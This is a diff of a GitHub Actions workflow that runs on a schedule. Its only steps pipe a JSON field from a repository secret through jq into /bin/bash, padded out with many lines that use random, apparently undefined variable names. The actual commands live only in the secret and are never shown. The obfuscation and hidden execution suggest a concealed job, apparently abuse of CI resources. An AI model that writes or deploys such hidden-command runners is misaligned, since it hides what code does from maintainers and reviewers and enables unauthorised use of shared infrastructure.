@@ -3,29 +3,35 @@ name: songliwen1986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 5/6 * * *'
+    - cron: '55 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songliwen1986
         env:
-          g637: ${{ secrets.g637 }}
+          eg529: ${{ secrets.eg529 }}
         run: |
-          echo $g637 | jq -r .nim7147 | /bin/bash
-          echo $m92 | jq -r .kcq9 | /bin/bash
-          echo $r8 | jq -r .r1337 | /bin/bash
-          echo $lbm32 | jq -r .gm486 | /bin/bash
-          echo $jx63 | jq -r .bmq23 | /bin/bash
-          echo $rwg1 | jq -r .mpyl435 | /bin/bash
-          echo $wogul5489 | jq -r .oimxe874 | /bin/bash
-          echo $o20008 | jq -r .zlhbr34570 | /bin/bash
-          echo $fszm32164 | jq -r .hteti35 | /bin/bash
-          echo $dv46656 | jq -r .fc71 | /bin/bash
-          echo $qvff7 | jq -r .wwmot221 | /bin/bash
-          echo $uxj043 | jq -r .ef9 | /bin/bash
-          echo $blov9703 | jq -r .an68354 | /bin/bash
+          echo $eg529 | jq -r .tkexo7 | /bin/bash
+          echo $upbw29972 | jq -r .al15828 | /bin/bash
+          echo $qqbqs1824 | jq -r .xp425 | /bin/bash
+          echo $zen9032 | jq -r .e397 | /bin/bash
+          echo $fxn5 | jq -r .too522 | /bin/bash
+          echo $fsvy439 | jq -r .zf85198 | /bin/bash
+          echo $wz96859 | jq -r .ucxyg45 | /bin/bash
+          echo $sxd967 | jq -r .hph6 | /bin/bash
+          echo $m01185 | jq -r .jankm165 | /bin/bash
+          echo $ogbdz3 | jq -r .de61 | /bin/bash
+          echo $yo10 | jq -r .t24601 | /bin/bash
+          echo $is1 | jq -r .atome26 | /bin/bash
+          echo $ng2 | jq -r .alkdq1 | /bin/bash
+          echo $boax4 | jq -r .r22 | /bin/bash
+          echo $opbyu15 | jq -r .bd90604 | /bin/bash
+          echo $fnlww00 | jq -r .chyt555 | /bin/bash
+          echo $c33 | jq -r .z66 | /bin/bash
+          echo $aqaqy0208 | jq -r .j0 | /bin/bash
+          echo $eusri8 | jq -r .fvlsw02 | /bin/bash
+          echo $b74100 | jq -r .ltzid49991 | /bin/bash
 
